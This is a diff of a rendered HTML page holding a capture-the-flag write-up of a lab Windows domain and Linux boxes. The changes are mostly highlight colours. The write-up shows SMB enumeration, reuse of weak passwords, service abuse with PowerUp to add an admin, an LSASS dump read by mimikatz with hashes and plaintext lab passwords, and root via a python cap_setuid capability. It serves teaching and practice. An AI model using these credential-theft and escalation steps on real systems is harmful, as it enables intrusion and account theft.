-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#268bd2">#new</span> <span style="color:#268bd2">joiners</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rogerio.marques</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rute.rodrigues</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rita.munoiz</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">renato.recesso</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">carolina.azevedo</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">casemiro.silva</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">jose.borges</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">stefan.silva</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">mary.christmas</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">rodgers.john</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span> <span style="color:#268bd2">/domain</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">#new</span> <span style="color:#a6e22e">joiners</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">rogerio.marques</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">rute.rodrigues</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">rita.munoiz</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">renato.recesso</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">carolina.azevedo</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">casemiro.silva</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">jose.borges</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">stefan.silva</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">mary.christmas</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">rodgers.john</span> <span style="color:#a6e22e">Summer2022</span> /add /domain
 </span></span></code></pre></div><ul>
 <li>Knowing this I tried to authenticate anonymously on <code>.30</code> to check those shares</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbclient --no-pass -L //192.168.111.30/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbclient --no-pass -L //192.168.111.30/
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	Sharename       Type      Comment
 </span></span><span style="display:flex;"><span>	---------       ----      -------
@@ -327,14 +496,14 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </span></span></code></pre></div><ul>
 <li>After this I tried to the creds I&rsquo;ve found but only <code>sedalfino.freitas</code> were working but still I got the same privileges as anonymous</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbmap -u <span style="color:#2aa198">&#39;sedalfino.freitas&#39;</span> -p <span style="color:#2aa198">&#39;Summer2022&#39;</span> -d <span style="color:#2aa198">&#39;bajordas&#39;</span> -H 192.168.111.26
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbmap -u <span style="color:#e6db74">&#39;sedalfino.freitas&#39;</span> -p <span style="color:#e6db74">&#39;Summer2022&#39;</span> -d <span style="color:#e6db74">&#39;bajordas&#39;</span> -H 192.168.111.26
 </span></span></code></pre></div><ul>
 <li>After some minutes (hours?) I decided to use xfreerdp and connect to any machine and I was able to do that on <code>.41</code> but using remmina with <code>sedalfino.freitas:Summer2022</code> and <code>BAJORDAS.LOCAL</code> creds</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>oneSmallFootInTheEnterprise<span style="color:#719e07">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>oneSmallFootInTheEnterprise<span style="color:#f92672">}</span>
 </span></span></code></pre></div><br>
-<h2 id="second-recon">Second recon<a hidden class="anchor" aria-hidden="true" href="#second-recon">#</a></h2>
-<h3 id="spread-your-hacks">Spread Your Hacks<a hidden class="anchor" aria-hidden="true" href="#spread-your-hacks">#</a></h3>
+<h2 id="second-recon">Second recon</h2>
+<h3 id="spread-your-hacks">Spread Your Hacks</h3>
 <p><em>&ldquo;You got in? Noice!&rdquo;</em>
 <em>&ldquo;I heard they got a special machine for &ldquo;Important People&rdquo;, but they are not very security-focused and their automation is faulty. Can you access it?&rdquo;</em></p>
 <br>
@@ -346,9 +515,9 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>enum4linux gave me some creds</p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ enum4linux -u <span style="color:#2aa198">&#34;sedalfino.freitas&#34;</span> -p <span style="color:#2aa198">&#34;Summer2022&#34;</span> -U 192.168.111.26<span style="color:#586e75">`</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ enum4linux -u <span style="color:#e6db74">&#34;sedalfino.freitas&#34;</span> -p <span style="color:#e6db74">&#34;Summer2022&#34;</span> -U 192.168.111.26<span style="color:#e6db74">`</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>index: 0x109a RID: 0x454 acb: 0x00000210 Account: big.boss Name: big boss Desc: Password: Money<span style="color:#268bd2">$$</span>$ , make all managers the same password so I have access
+</span></span><span style="display:flex;"><span>index: 0x109a RID: 0x454 acb: 0x00000210 Account: big.boss Name: big boss Desc: Password: Money$$$ , make all managers the same password so I have access
 </span></span></code></pre></div><ul>
 <li>
 <p>Using <code>big.boss:Money$$$</code> I was able to rdp to <code>192.168.111.41</code> and <code>192.168.42</code></p>
@@ -357,21 +526,21 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>On <code>192.168.111.42</code> I&rsquo;ve found the flag</p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>slowMovingRabbit<span style="color:#719e07">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>slowMovingRabbit<span style="color:#f92672">}</span>
 </span></span></code></pre></div><br>
-<h2 id="first-windows-priv-esc">First Windows Priv Esc<a hidden class="anchor" aria-hidden="true" href="#first-windows-priv-esc">#</a></h2>
-<h3 id="big-dollar-spender">Big Dollar Spender<a hidden class="anchor" aria-hidden="true" href="#big-dollar-spender">#</a></h3>
+<h2 id="first-windows-priv-esc">First Windows Priv Esc</h2>
+<h3 id="big-dollar-spender">Big Dollar Spender</h3>
 <p><em>&ldquo;You in? Nice! Can you pwn it? Maybe&hellip;&rdquo;</em></p>
 <p><em>&ldquo;They installed some shady service and hammered things down to make it work. Maybe it can be exploited in your favour&rdquo;</em></p>
 <br>
 <ul>
 <li>While doing enumeration and research on <code>192.168.111.42</code> i noticed a strange file</li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186279966-faba5a17-86f1-4f63-8963-247f750c18fc.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186279966-faba5a17-86f1-4f63-8963-247f750c18fc.png" alt="image"></p>
 <ul>
 <li>winPEAS did a great job identifing the strange file permissions</li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280079-4c18c89c-ef06-412b-9773-84af9b6abbff.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186280079-4c18c89c-ef06-412b-9773-84af9b6abbff.png" alt="image"></p>
 <ul>
 <li>
 <p>After some hours of digging google and trying to understand how could I exploit this, I noticed that I could execute the file</p>
@@ -380,30 +549,31 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>Everytime I tried executing the file I had an error</p>
 </li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280294-3cdf01b3-8e15-4300-92df-01b68d8120e2.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186280294-3cdf01b3-8e15-4300-92df-01b68d8120e2.png" alt="image"></p>
 <ul>
 <li>
 <p>Then I created a malicious .bat file that creates an user and gives permissions to that user but that didn&rsquo;t work either</p>
 </li>
 <li>
-<p>Next thing was to use <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/powerup">PowerUp</a></p>
+<p>Next thing was to use <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/powerup" target="_blank">PowerUp</a>
+</p>
 </li>
 <li>
 <p>With PowerUp executed I noticed a couple stuff i could do like abusing the service <code>bajordas-svc</code> with PowerUp</p>
 </li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280695-ce41f69b-a109-4bdc-b58c-1c10be302f2c.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186280695-ce41f69b-a109-4bdc-b58c-1c10be302f2c.png" alt="image"></p>
 <ul>
 <li>Abused the <code>bajordas-svc</code> and got a new user with Admin privileges</li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186280851-bcfbd706-5081-4571-b07e-10dae5b5393b.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186280851-bcfbd706-5081-4571-b07e-10dae5b5393b.png" alt="image"></p>
 <ul>
 <li>To sign-in as this user I used rdp and got the flag inside <code>C:\Users\Administrator\Desktop</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>GameOn!<span style="color:#719e07">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>GameOn!<span style="color:#f92672">}</span>
 </span></span></code></pre></div><br>
-<h2 id="third-recon">Third recon<a hidden class="anchor" aria-hidden="true" href="#third-recon">#</a></h2>
-<h3 id="other-os-are-people-2">Other Os Are People 2<a hidden class="anchor" aria-hidden="true" href="#other-os-are-people-2">#</a></h3>
+<h2 id="third-recon">Third recon</h2>
+<h3 id="other-os-are-people-2">Other Os Are People 2</h3>
 <p><em>&ldquo;Larapios said there are some Linux machines loose in the environment and the System Administrator reuses their credentials 😩.&rdquo;</em></p>
 <p><em>&ldquo;Can you access them?&rdquo;</em></p>
 <br>
@@ -412,37 +582,39 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>I jumped to <code>192.168.111.41</code> to try to find creds because they could be helpful to the future</p>
 </li>
 <li>
-<p>First thing I did was to use <a href="https://github.com/ParrotSec/mimikatz">mimikatz</a></p>
+<p>First thing I did was to use <a href="https://github.com/ParrotSec/mimikatz" target="_blank">mimikatz</a>
+</p>
 </li>
 <li>
 <p>For somereason I had touble using mimikatz to dump some creds, even with the latest version I wasn&rsquo;t lucky</p>
 </li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186284584-2eff753a-cad1-42b0-a1e9-4d16a1d82d03.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186284584-2eff753a-cad1-42b0-a1e9-4d16a1d82d03.png" alt="image"></p>
 <ul>
-<li>@darkcookie gave me an hint so I tried to <a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf">dump the LSASS</a> and then use the minidump to get stored credentials</li>
+<li>@darkcookie gave me an hint so I tried to <a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf" target="_blank">dump the LSASS</a>
+ and then use the minidump to get stored credentials</li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186284823-3f6bcb3d-6c7d-42f3-9e2b-226be1338436.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186284823-3f6bcb3d-6c7d-42f3-9e2b-226be1338436.png" alt="image"></p>
 <ul>
 <li>After following the medium guide I got a creds for <code>bacano.do.it</code> and some other known accounts</li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186285244-3ec93fc5-5d87-44ea-b7b5-2c9b66f6ff59.png"></p>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#cb4b16">\U</span>sers<span style="color:#cb4b16">\b</span>run0<span style="color:#cb4b16">\D</span>esktop&gt; .<span style="color:#cb4b16">\m</span>imikatz.exe
+<p><img src="https://user-images.githubusercontent.com/12052283/186285244-3ec93fc5-5d87-44ea-b7b5-2c9b66f6ff59.png" alt="image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>run0<span style="color:#ae81ff">\D</span>esktop&gt; .<span style="color:#ae81ff">\m</span>imikatz.exe
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 <span style="color:#719e07">(</span>x64<span style="color:#719e07">)</span> <span style="color:#586e75">#19041 Aug 10 2021 17:19:53</span>
-</span></span><span style="display:flex;"><span> .## ^ <span style="color:#586e75">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
-</span></span><span style="display:flex;"><span> <span style="color:#586e75">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
-</span></span><span style="display:flex;"><span> <span style="color:#586e75">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
-</span></span><span style="display:flex;"><span> <span style="color:#2aa198">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#719e07">(</span> vincent.letoux@gmail.com <span style="color:#719e07">)</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#2aa198">&#39;#####&#39;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> <span style="color:#75715e">#19041 Aug 10 2021 17:19:53</span>
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#75715e">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#f92672">(</span> vincent.letoux@gmail.com <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;#####&#39;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>mimikatz <span style="color:#586e75"># lsadump::trust /patch</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># lsadump::trust /patch</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>mimikatz <span style="color:#586e75"># sekurlsa::minidump C:\Users\brun0\AppData\Local\Temp\lsass.DMP</span>
-</span></span><span style="display:flex;"><span>Switch to MINIDUMP : <span style="color:#2aa198">&#39;C:\Users\brun0\AppData\Local\Temp\lsass.DMP&#39;</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::minidump C:\Users\brun0\AppData\Local\Temp\lsass.DMP</span>
+</span></span><span style="display:flex;"><span>Switch to MINIDUMP : <span style="color:#e6db74">&#39;C:\Users\brun0\AppData\Local\Temp\lsass.DMP&#39;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>mimikatz <span style="color:#586e75"># sekurlsa::logonpasswords</span>
-</span></span><span style="display:flex;"><span>Opening : <span style="color:#2aa198">&#39;C:\Users\brun0\AppData\Local\Temp\lsass.DMP&#39;</span> file <span style="color:#719e07">for</span> minidump...
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::logonpasswords</span>
+</span></span><span style="display:flex;"><span>Opening : <span style="color:#e6db74">&#39;C:\Users\brun0\AppData\Local\Temp\lsass.DMP&#39;</span> file <span style="color:#66d9ef">for</span> minidump...
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>User Name         : rogerio.marques
 </span></span><span style="display:flex;"><span>Domain            : BAJORDAS
@@ -450,7 +622,7 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </span></span><span style="display:flex;"><span>Logon Time        : 8/23/2022 10:11:40 PM
 </span></span><span style="display:flex;"><span>SID               : S-1-5-21-705575555-4224697876-3339875019-1121
 </span></span><span style="display:flex;"><span>        msv :
-</span></span><span style="display:flex;"><span>         <span style="color:#719e07">[</span>00000003<span style="color:#719e07">]</span> Primary
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">[</span>00000003<span style="color:#f92672">]</span> Primary
 </span></span><span style="display:flex;"><span>         * Username : rogerio.marques
 </span></span><span style="display:flex;"><span>         * Domain   : BAJORDAS
 </span></span><span style="display:flex;"><span>         * NTLM     : a3d7d25665f1146b56192b850fd57a93
@@ -461,8 +633,8 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </span></span><span style="display:flex;"><span>         * Domain   : BAJORDAS.LOCAL
 </span></span><span style="display:flex;"><span>         * Password : Summer2022
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Authentication Id : <span style="color:#2aa198">0</span> ; <span style="color:#2aa198">440390</span> <span style="color:#719e07">(</span>00000000:0006b846<span style="color:#719e07">)</span>
-</span></span><span style="display:flex;"><span>Session           : RemoteInteractive from <span style="color:#2aa198">3</span>
+</span></span><span style="display:flex;"><span>Authentication Id : <span style="color:#ae81ff">0</span> ; <span style="color:#ae81ff">440390</span> <span style="color:#f92672">(</span>00000000:0006b846<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Session           : RemoteInteractive from <span style="color:#ae81ff">3</span>
 </span></span><span style="display:flex;"><span>User Name         : Administrator
 </span></span><span style="display:flex;"><span>Domain            : LAB-WIN6
 </span></span><span style="display:flex;"><span>Logon Server      : LAB-WIN6
@@ -474,32 +646,34 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </span></span><span style="display:flex;"><span>        kerberos :
 </span></span><span style="display:flex;"><span>        ssp :
 </span></span><span style="display:flex;"><span>        credman :
-</span></span><span style="display:flex;"><span>         <span style="color:#719e07">[</span>00000000<span style="color:#719e07">]</span>
-</span></span><span style="display:flex;"><span>         * Username : BAJORDAS<span style="color:#cb4b16">\b</span>acano.do.it
-</span></span><span style="display:flex;"><span>         * Domain   : BAJORDAS<span style="color:#cb4b16">\b</span>acano.do.it
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">[</span>00000000<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>         * Username : BAJORDAS<span style="color:#ae81ff">\b</span>acano.do.it
+</span></span><span style="display:flex;"><span>         * Domain   : BAJORDAS<span style="color:#ae81ff">\b</span>acano.do.it
 </span></span><span style="display:flex;"><span>         * Password : ViniVidiVici420!
 </span></span></code></pre></div><ul>
 <li>Next thing I did was to login with ssh in <code>192.168.111.31</code> with <code>bacano.do.it</code> and I got the flag</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>pinguinsRPeople2<span style="color:#719e07">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>pinguinsRPeople2<span style="color:#f92672">}</span>
 </span></span></code></pre></div><ul>
 <li>There was another challenge called <code>Shells, Shells, Shells</code> but I got the flag on this one too by using ssh in <code>192.168.111.34</code> with the same creds of <code>bacano.do.it</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>OneMore4TheRoad<span style="color:#719e07">}</span>
-</span></span></code></pre></div><h2 id="first-linux-priv-esc">First Linux Priv Esc<a hidden class="anchor" aria-hidden="true" href="#first-linux-priv-esc">#</a></h2>
-<h3 id="captain-pwn">CAPtain Pwn!<a hidden class="anchor" aria-hidden="true" href="#captain-pwn">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>OneMore4TheRoad<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="first-linux-priv-esc">First Linux Priv Esc</h2>
+<h3 id="captain-pwn">CAPtain Pwn!</h3>
 <p><em>&ldquo;The System Administrator was having trouble getting scripts to run but found a way to always work!&rdquo;</em></p>
 <p><em>&ldquo;Can you abuse the misconfiguration and pwn the machine?&rdquo;</em></p>
 <br>
 <ul>
 <li>
-<p>Now was time to privesc the Linux box <code>.31</code> so for that I ran <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a></p>
+<p>Now was time to privesc the Linux box <code>.31</code> so for that I ran <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">linpeas</a>
+</p>
 </li>
 <li>
-<p>The output of linpeas gave me a cool finding about <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/"><code>/usr/bin/python3.8 = cap_setuid+ep</code></a></p>
+<p>The output of linpeas gave me a cool finding about <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" target="_blank"><code>/usr/bin/python3.8 = cap_setuid+ep</code></a>
+</p>
 </li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186418732-aa6b5c4c-3941-498c-97c5-e087c5921d95.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186418732-aa6b5c4c-3941-498c-97c5-e087c5921d95.png" alt="image"></p>
 <ul>
 <li>
 <p>As the blog post stated <em>&ldquo;As we know when the system creates a work context for each user where they achieve their tasks with the privileges that are assigned to them. So, to provide some specific functionalities, it is necessary for a non-privileged user to sometimes temporarily acquire a superuser profile to perform a specific task. This functionality mainly can be achieved by assigning privileges through sudo, or setuid permissions to an executable file which allows the user to adopt the role of the file owner. To accomplish the same task in a more secure way the system admin uses “capability” which plays an effective role in the security of Linux based operating systems.&rdquo;</em></p>
@@ -508,11 +682,11 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>Knowing this It&rsquo;s clear I can execute python (and that will have the setuid bit set) with root privileges, so It&rsquo;s trivial to spawn a shell as root</p>
 </li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186419606-7ec2df45-5f8a-4b28-b471-6a4aed94f9ec.png"></p>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>HelloCAPtain<span style="color:#719e07">}</span>
+<p><img src="https://user-images.githubusercontent.com/12052283/186419606-7ec2df45-5f8a-4b28-b471-6a4aed94f9ec.png" alt="image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>HelloCAPtain<span style="color:#f92672">}</span>
 </span></span></code></pre></div><br>
-<h2 id="second-linux-priv-esc">Second Linux Priv Esc<a hidden class="anchor" aria-hidden="true" href="#second-linux-priv-esc">#</a></h2>
-<h3 id="so-cute">SO Cute!<a hidden class="anchor" aria-hidden="true" href="#so-cute">#</a></h3>
+<h2 id="second-linux-priv-esc">Second Linux Priv Esc</h2>
+<h3 id="so-cute">SO Cute!</h3>
 <p><em>&ldquo;Infrastructure logs show a weird behaviour on one binary left in the server but we couldn&rsquo;t discover how can we abuse it to render the server to its knees. Everything is patched so there will be a challenge.&rdquo;</em></p>
 <p><em>&ldquo;Can you analyze the server and look for ways to overcome its security?&rdquo;</em></p>
 <ul>
@@ -526,7 +700,7 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>Navigating to <code>/usr/sbin</code> I found an interesting binary</p>
 </li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186481520-196af136-c182-4d89-af6d-4cc50a97989b.png"></p>
